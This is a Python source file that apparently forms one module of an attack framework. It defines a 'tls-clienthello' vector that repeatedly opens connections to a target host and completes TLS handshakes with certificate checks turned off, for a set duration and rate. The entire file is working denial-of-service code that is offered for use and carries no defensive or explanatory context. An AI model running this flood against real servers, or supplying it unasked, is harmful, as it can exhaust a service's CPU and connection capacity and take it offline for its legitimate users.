import socket
import ssl
import time
from _lib.ring1.base import Vector


class ClientHelloFlood(Vector):
    name = "tls-clienthello"; needs = ["ipv4"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port") or 443
        end = time.time() + args.duration
        sent = 0
        while time.time() < end:
            try:
                s = socket.create_connection((host, port), timeout=2)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s, do_handshake_on_connect=False)
                ss.do_handshake()
                ss.close()
                sent += 1
            except Exception:
                pass
            time.sleep(1.0 / max(1, args.rate))
        print(f"  tls-clienthello: {sent}")
